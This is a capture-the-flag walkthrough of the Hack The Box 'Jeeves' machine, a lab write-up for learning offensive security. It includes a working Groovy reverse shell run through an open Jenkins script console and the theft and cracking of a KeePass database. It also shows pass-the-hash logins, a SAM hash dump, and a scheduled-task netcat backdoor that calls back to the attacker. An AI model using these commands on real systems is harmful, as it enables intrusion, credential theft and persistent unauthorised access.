+++
title = "Jeeves HTB Walkthrough: Jenkins RCE, KeePass Cracking, and ADS Flag Discovery"
draft = false
tags = [
  "Windows", "HTB", "Hack The Box", "Medium", "SMB", "Active Directory", "ibm-db2", "db2", "jenkins", "Jenkins RCE", "war", "powershell", "keepass2john", "john", "kdbx", "Privilege Escalation", "Alternative Data Streams", "Persistence", "Password Cracking"
]
keywords = [
  "Hack The Box Jeeves", "Jeeves walkthrough", "Jenkins RCE exploitation", "KeePass password cracking", "Windows privilege escalation", "SMB enumeration", "ibm-db2 exploitation", "Active Directory attacks", "Alternative Data Streams CTF", "HTB medium box", "Jenkins war file exploit", "john the ripper keepass", "Windows persistence techniques"
]
description = "A comprehensive walkthrough of the Jeeves machine from Hack The Box, demonstrating Jenkins RCE exploitation, KeePass password cracking, privilege escalation via alternative data streams (ADS), and advanced Windows persistence techniques. Learn how to enumerate SMB, exploit Jenkins, crack KeePass databases, and uncover hidden flags in this medium-difficulty HTB box."
author = "bloodstiller"
date = 2025-06-18
toc = true
bold = true
next = true
lastmod = 2025-06-18
+++

## Jeeves Hack The Box Walkthrough/Writeup: {#jeeves-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Jeeves>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

**TCP**:

```shell
#Command
nmap $box -Pn -oA TCPbasicScan

#Results
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 06:51 BST
Nmap scan report for 10.129.184.134
Host is up (0.040s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2


```

-   **Initial thoughts**:
    -   We have web, rpc, SMB &amp; and ibm-db2 instance also.

<!--listend-->

-   **UDP**:
    ```shell
    #Command
    sudo nmap $box -sU -Pn -oA UDPbasicScan

    #Results
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 09:06 BST
    Nmap scan report for 10.129.184.134
    Host is up.
    All 1000 scanned ports on 10.129.184.134 are in ignored states.
    Not shown: 1000 open|filtered udp ports (no-response)

    Nmap done: 1 IP address (1 host up) scanned in 214.46 seconds

    ```

    -   **Initial thoughts**: No ports open.


#### Comprehensive Scans: {#comprehensive-scans}

```shell
#Command
sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP

#Results
[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 06:52 BST
Nmap scan report for 10.129.184.134
Host is up (0.022s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-06-12T10:55:42
|_  start_date: 2025-06-12T10:41:07
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.34 seconds

```

-   **Findings**:
    -   First we hit SMB &amp; web then 5000.
    -   Interesting note, there is the service `jetty 9.4.z-SNAPSHOT`


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:

```shell
netexec smb $box -u 'guest' -p '' --shares
netexec smb $box -u '' -p '' --shares
```

Both are disabled.
![](/ox-hugo/2025-06-12-065542_.png)

-   +Note+: We can see the build number is 10586 We can now enumerate that.


### Web `80`: {#web-80}


#### WhatWeb: {#whatweb}

Lets run [WhatWeb](https://github.com/urbanadventurer/WhatWeb) to see if I can glean some further information.

```shell
#Command
whatweb http://$box | sed 's/, /\n/g'

#Output
http://10.129.184.134 [200 OK] Country[RESERVED][ZZ]
HTML5
HTTPServer[Microsoft-IIS/10.0]
IP[10.129.184.134]
Microsoft-IIS[10.0]
Title[Ask Jeeves]

```

-   **Results**: It looks like it's running a self hosted version of Ask Jeeves.
    +Note+: I use `sed` to display the output across multiple lines for easier readability.


#### Dirbusting The Webserver Running Using FFUF: {#dirbusting-the-webserver-running-using-ffuf}

We can perform some directory busting to see if there are any interesting directories.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -fs [ignoreSize] -ic
```

There are none other than `index.html`


#### File Enumeration Using FFUF: {#file-enumeration-using-ffuf}

We can perform some file busting to see if there are any interesting files with the extension we have found.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ.html -ic
```

There are none other than `index.html` &amp; `error.html`
![](/ox-hugo/2025-06-12-090721_.png)


#### <span class="org-todo todo TODO">TODO</span> Subdomain Enumeration with FFUF: {#subdomain-enumeration-with-ffuf}

Let's enumerate any possible subdomains with ffuf.

```shell
ffuf -w /home/kali/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://$box -H "Host:FUZZ.$box" -fs 230 -ic
```


#### Enumerating Injection Points With Burpsuite: {#enumerating-injection-points-with-burpsuite}

-   **Web Enumeration via Burp Suite**:
    -   When manually enumerating a Website, always use Burp Suite. This allows you to:
    -   Record all potential injection points.
    -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


#### Discovering the Host is running MSSQL 2005: {#discovering-the-host-is-running-mssql-2005}

Navigating to the home page we can see it's running Ask Jeeves as expected.
![](/ox-hugo/2025-06-12-070152_.png)

If we run a search we get the following response, where we can see it's running `MSSQL 2005 - 9.00.4053.00`
![](/ox-hugo/2025-06-12-070321_.png)

What's strange is that this is just a `PNG` file and that we are not getting a standard error
![](/ox-hugo/2025-06-12-070513_.png)

Looking at the source code it seems it will only return the `error.html` page too.
![](/ox-hugo/2025-06-12-070810_.png)

Looking further at the request on the page we can see that no actual argument is being passed in the `GET` request.
![](/ox-hugo/2025-06-12-090939_.png)


### Discovering An Open Jenkins instance running: {#discovering-an-open-jenkins-instance-running}

Let's dirbust the ibm-db2 service.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box:50000/FUZZ -ic
```

There is one hit for `askjeeves` that is a redirect.
![](/ox-hugo/2025-06-12-093106_.png)

Let's `Whatweb` the url and see what we get
<http://10.129.184.134:5000/askjeeves>

```shell
whatweb http://$box:50000/askjeeves | sed 's/, /\n/g'
```

As we can see it redirects to a jenkins instance, version `2.87`.
![](/ox-hugo/2025-06-12-094948_.png)

Navigating to the address allows us to access the instance without providing credentials
![](/ox-hugo/2025-06-12-095121_.png)


#### Side Quest: What is Jenkins? {#side-quest-what-is-jenkins}

Jenkins is an open-source automation server that's widely used in the software development lifecycle, particularly for CI/CD (Continuous Integration and Continuous Delivery). It's used by developers to automatically build, test, and deploy code so they don’t have to. Jenkins uses pipelines, which are typically written in a scripting language called Groovy (kinda like if Bash &amp; Java and were pushed together).

The cool, albeit dangerous thing is these pipelines can execute code, which makes Jenkins incredibly powerful&#x2026; and potentially a great attack surface when misconfigured for us.


## 2. Foothold: {#2-dot-foothold}


### Getting RCE via Jenkins: {#getting-rce-via-jenkins}

As a POC let's see if we can get RCE on the host and have Jenkins ping our attack host.


#### Jenkins RCE Option 1: Creating a New Jenkins Job: {#jenkins-rce-option-1-creating-a-new-jenkins-job}


##### Creating A New Jenkins Job: {#creating-a-new-jenkins-job}

Select "New Item".
![](/ox-hugo/2025-06-16-065825_.png)

Select "Freestyle Project" &amp; give the project a name &amp; click "OK"
![](/ox-hugo/2025-06-16-070044_.png)

Under the "Build" heading click "Execute Windows Batch Command"
![](/ox-hugo/2025-06-16-071821_.png)
+Note+: If this was a Linux instance we would select "Execute Shell"

In the "Command" box we will put in a simple ping command to ping our host

```cmd
ping 10.10.14.16
```

{{< figure src="/ox-hugo/2025-06-16-071929_.png" >}}

Now click "Save" at the bottom of the page
![](/ox-hugo/2025-06-16-070343_.png)


##### Using TCPDUMP To Listen for Ping Traffic: {#using-tcpdump-to-listen-for-ping-traffic}

We will use TCPDUMP on our attack host to listen for ping traffic

```shell
sudo tcpdump -n -i tun0 icmp
```


##### Executing The Jenkins Job: {#executing-the-jenkins-job}

We now select "Build Now" in jenkins and this will trigger the build pipeline.
![](/ox-hugo/2025-06-16-072040_.png)
As we can see we now see we have RCE on the host as the pings hit our listener.


#### Jenkins RCE Option 2: Using the Scripting Console: {#jenkins-rce-option-2-using-the-scripting-console}

We can also use the jenkins scripting console by navigating to -

-   <http://10.129.228.112:50000/askjeeves/script>

As this is a Windows Install we will use the below syntax to execute code

```shell
# Anything we put here will be run, below is just an example.
def cmd = "cmd.exe /c ping 10.10.14.16".execute();
println("${cmd.text}");
```

As you can see after we click "Run" it executes and we get output as the "Result"
![](/ox-hugo/2025-06-16-072647_.png)

Let's take a quick look and see what users are present on the system.

```shell
#When running command with trailing backslashes we need to escape them using double slashes
def cmd = ["cmd.exe", "/c", "dir", "C:\\Users\\"].execute()
println("${cmd.text}");
```

{{< figure src="/ox-hugo/2025-06-16-072905_.png" >}}


##### Jenkins Linux Scripting Console Syntax: {#jenkins-linux-scripting-console-syntax}

Note if jenkins is running on Linux the syntax is slightly different when running commands in the script console.

```shell
# Anything we put here will be run, below is just an example.
def cmd = 'ls -la /root/.ssh'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```


#### Using The Jenkins Scripting Console To Get A Reverse Shell: {#using-the-jenkins-scripting-console-to-get-a-reverse-shell}

As we have RCE on the host we can use the jenkins scripting console to get a reverse shell.

```shell
String host="10.10.14.16";
int port=53;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

We setup a listener:

```shell
rlwrap -cAr nc -nvlp 53
```

Then hit "run"
![](/ox-hugo/2025-06-16-073829_.png)

+Note+: There is also a metasploit module that can be used for this.

-   `use exploit/multi/http/jenkins_script_console`


### Checking `config.xml`: {#checking-config-dot-xml}

In most jenkins instances we can find hashed passwords in the `config.xml` file, located in the root of the install.
![](/ox-hugo/2025-06-16-075832_.png)

However in this case there does not appear to be any.


### Finding The Initial Jenkins Admin Password: {#finding-the-initial-jenkins-admin-password}

If we navigate to the secrets folder we can also find the initial jenkins admin password, this is generated on install by jenkins.
![](/ox-hugo/2025-06-16-075238_.png)
+Note+: This is purely for jenkins only, however we will take a copy of it for documentation purposes.


### Discovering Admin Password Hash in Jenkins `config.xml`: {#discovering-admin-password-hash-in-jenkins-config-dot-xml}

If we navigate to `users\admin` we will find a file called `config.xml` checking this file we can see it contains a password hash for the jenkins admin user.
![](/ox-hugo/2025-06-16-074221_.png)
As we can see this is actually a `bcrypt` encrypted password.

There is also an API token at the top of the page we will take a note of also as this could be useful later on.
![](/ox-hugo/2025-06-16-074318_.png)


### Attempting To Crack The encrypted hash: {#attempting-to-crack-the-encrypted-hash}

I did try and crack with hashcat but it did not crack &amp; it should be noted that cracking bcrypt hashes can be a slow process.

```shell
hashcat -m 3200 jenkins.hash -w ~/Wordlists/rockyou.txt
```


### Checking Our Users Permissions &amp; groups: {#checking-our-users-permissions-and-groups}

Let's enumerate what user we are running as and what groups &amp; privileges they have.

```cmd
whoami && whoami /priv && whoami /groups
```

{{< figure src="/ox-hugo/2025-06-17-065759_.png" >}}

We can see we are running as the user `kohsuke` &amp; that they have the `SeImpersonatePrivilege`. Usually this would be a slam dunk in regards to privesc as we could use the `PrintSpoofer` or `Potato Exploits` to privesc, however I have tried these and I cannot get them to work as expected.

The user is not part of any interesting groups.

Lets get our flag.
![](/ox-hugo/2025-06-17-070951_.png)


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Finding A KeePass Archive Enumerating As kohsuke: {#finding-a-keepass-archive-enumerating-as-kohsuke}

Enumerating as kohsuke we can see they have a keepass database in their documents folder. We may be able to extract crack this and retrieve passwords lets transfer it back to our host.
![](/ox-hugo/2025-06-17-071915_.png)

We are going to encode the file using `base64` and then copy the string to our host and decode it back into the file.

To do this we are going to use a nested powershell commands as there are certain things we can only do with powershell (as the tools that would enable us to perform the tasks with CMD are not present. We also use nested commands as this shell doesn't play nice if we try and switch directly to powershell.


#### 1. Generating A MD5 hash Of The Object: {#1-dot-generating-a-md5-hash-of-the-object}

We will generate an MD5 hash so we can ensure that the transfer did not alter the contents.

```powershell
powershell -command "Get-FileHash -Path 'C:\Users\kohsuke\Documents\CEH.kdbx' -Algorithm MD5 | Select Hash"
```

{{< figure src="/ox-hugo/2025-06-17-195526_.png" >}}

As we see we get the value `519237656FDECAD4B9A5C82F40AADDEB`


##### Generating A Hash With `certutil`: {#generating-a-hash-with-certutil}

We can also generate an MD5 from CMD by using `certutil`. However in this case it is not installed on the host, below is the command that could be used if the binary was present.

```shell
#Command
certutil -hashfile <filepath> <hashingAlgorithm>
#Example
certutil -hashfile C:\Users\kohsuke\Documents\CEH.kdbx MD5
```

+Note+: Without `certutil` there is no native way to generate a hash from cmd, this is why are we using powershell.


#### 2. Base64 Encode The KeePass Database For Transfer: {#2-dot-base64-encode-the-keepass-database-for-transfer}

Now lets base64 encode the object so we get a base64 string we can decode.

```powershell
powershell -command "[Convert]::ToBase64String((Get-Content -Path 'C:\Users\kohsuke\Documents\CEH.kdbx' -Encoding Byte))"
```

{{< figure src="/ox-hugo/2025-06-17-195741_.png" >}}


#### 3. Decoding The Base64 Encoded String Back Into the KeePass Database: {#3-dot-decoding-the-base64-encoded-string-back-into-the-keepass-database}

Now we have our base64 encoded string, lets decode it to re-create the original object.

```shell
echo 17mKUs3QryFwc96ihtoDruiozHAD0LLWW7b7TqkP[SNIPPET]PDubQASwjZ01U7MxXi+Zg3KwSv5e2yOjvcw=" | base64 -d  >> CEH.kdbx
```

{{< figure src="/ox-hugo/2025-06-17-200116_.png" >}}


#### 4. Comparing The Hashes To Ensure Transfer Was Successful: {#4-dot-comparing-the-hashes-to-ensure-transfer-was-successful}

First we will generate a hash on our linux host of the decoded object.

```shell
md5sum CEH.kdbx
```

{{< figure src="/ox-hugo/2025-06-17-200255_.png" >}}

Now we will check the hashes match to ensure these is no corruption.

```shell
bash -c 'str1="519237656FDECAD4B9A5C82F40AADDEB"; str2="519237656fdecad4b9a5c82f40aaddeb"; [ "${str1,,}" = "${str2,,}" ] && echo "Same" || echo "Different"'
```

![](/ox-hugo/2025-06-17-200859_.png)
+Note+: I am using a bash subshell as I use ZSH and this will throw an error otherwise.

So we can see they match, but as it's a KDBX file we will need the key to open it. Let's see if we can crack it.


### Cracking The KeePass Archive With `keepass2john` &amp; John: {#cracking-the-keepass-archive-with-keepass2john-and-john}

We can use the tool `keepass2john` to create a hash of the archive and then we can attempt to crack that hash.

```shell
keepass2john CEH.kdbx >> keepass.hash
```

{{< figure src="/ox-hugo/2025-06-17-201429_.png" >}}

Now we have our hash let's try and crack it.

Usually I prefer hashcat but as we have already used one John tool, why not use John today.

```shell
john --wordlist=~/Wordlists/rockyou.txt keepass.hash
```

![](/ox-hugo/2025-06-17-201649_.png)
It cracks!

And we now have our password `moonshine1` lets see if we can open the archive.


### Reading the passwords From The KeePass Database: {#reading-the-passwords-from-the-keepass-database}

If you don't have KeePass installed, it can be installed easily with the below command.

```shell
sudo apt update && sudo apt install keepassxc
```

+Note+: This is the xc variant, which I just prefer to use.

Lets open the database.
![](/ox-hugo/2025-06-17-202050_.png)

Enter the password.
![](/ox-hugo/2025-06-17-202254_.png)

And we are in.

Looking at the entries if we check the entry marked `Backup Stuff` we can see it contains a hash.
![](/ox-hugo/2025-06-17-203534_.png)

Trying this against the domain with netexec and a list of users we can see it is the administrator hash.

```shell
netexec smb $box -u Users.txt -H "e0fb1fb85756c24235ff238cbe81fe00" --shares --continue-on-success
```

{{< figure src="/ox-hugo/2025-06-17-203842_.png" >}}

We can then get a shell using `impacket-psexec`:

```shell
impacket-psexec $user@$box -hashes :$hash
```

{{< figure src="/ox-hugo/2025-06-17-204116_.png" >}}

Now we get our flag&#x2026;.or can we&#x2026;.
![](/ox-hugo/2025-06-17-204325_.png)

This is interesting. Initially I try and find the flag using the `where` command but cannot find it.

```shell
where /R C:\ root.txt
```

{{< figure src="/ox-hugo/2025-06-18-070208_.png" >}}


#### CTF Shenanigans After Lots Of Searching&#x2026;.. {#ctf-shenanigans-after-lots-of-searching-and-x2026-dot-dot}

So after lots of searching the OS and looking at different parts of the OS I couldn't find the flag so had to look for a hint.

I found that the box creator had used "alternative data streams" to hide the flag. I've never seen or heard of this happening in the wild so not bothered by looking at a hint as it seems very CTF like and not realistic.

We can read the flag with the below command.

```powershell
powershell Get-Content -Path "hm.txt" -Stream "root.txt"
```

{{< figure src="/ox-hugo/2025-06-18-073546_.png" >}}

As this was the first time I had come across this, I wanted to learn a bit more about ADS, so decided to make side-quest.


#### Side Quest: What's an alternative data stream (ADS)? {#side-quest-what-s-an-alternative-data-stream--ads}

Alternate Data Streams are a feature of NTFS, the file-system used by Windows. It allows us to hide data within an existing file without changing the file's main contents or size in a noticeable way.

It's kind of like a hidden compartment in a suitcase. The main file contents are the obvious items inside. The Alternate Data Stream is like a hidden compartment inside the suitcase, it doesn't show up in normal views but it’s still there and can be found if you know how to look for it.

In this case the creator of the box used an ADS on the `hm.txt` file.


##### Discovering ADS Alternative Data Streams: {#discovering-ads-alternative-data-streams}

We can view ADS in directories by using the `dir` command with the `/R` flag. This lists all files in the directory including any alternate data streams as well.

```shell
dir /R
```

{{< figure src="/ox-hugo/2025-06-18-075847_.png" >}}

This tells us that `hm.txt` has an alternate stream called `root.txt`.


##### Reading the ADS with Powershell: {#reading-the-ads-with-powershell}

To read the contents of the `root.txt` stream hidden in `hm.txt`, we can use:

```powershell
Get-Content -Path "hm.txt" -Stream "root.txt"
```

That command tells Powershell, look at the file `hm.txt`, but instead of reading the default content, read the alternate stream named `root.txt`.


## 4. Persistence: {#4-dot-persistence}


### Dumping SAM DB with `impacket-secretsdump`: {#dumping-sam-db-with-impacket-secretsdump}

We can use `impacket-secretsdump` to dump any entry's in the SAM file and extract the hashes.

```shell
impacket-secretsdump $domain/$user@$box -hashes :$hash
```

{{< figure src="/ox-hugo/2025-06-18-080839_.png" >}}


### Scheduled Task Back-door: {#scheduled-task-back-door}

We can make a scheduled task to reconnect back to our host every 1 minute as a means of persistence.

```shell
schtasks /create /tn BackDoor /tr "C:\Users\Administrator\Documents\nc64.exe 10.10.14.28 53 -e cmd" /sc minute /mo 1 /ru Administrator
```

{{< figure src="/ox-hugo/2025-06-18-081523_.png" >}}

**Command Breakdown**:

1.  `/sc minute`: Specifies that the task should run every minute.
2.  `/mo 1`: Runs the task every 1 minute.
3.  `/ru Administrator`: Runs the task with System privileges.
4.  `/tr`: Specifies the action to execute, in this case, running `nc64.exe` with the specified options.

+Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to me.

Shell Caught.
![](/ox-hugo/2025-06-18-081605_.png)

Just to double check I disconnect to ensure it calls back out to my host another two times.
![](/ox-hugo/2025-06-18-081803_.png)


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I am already pretty comfortable with jenkins so that was fine.
2.  I did learn about ADS, but I am yet to find a use other than metadata, as it seems like a security risk?
    -   <https://blog.netwrix.com/2022/12/16/alternate_data_stream/>
3.  This also felt like an easy box and not a medium box.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Not too many this time so that was nice, must be getting enough sleep.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at bloodstiller dot com


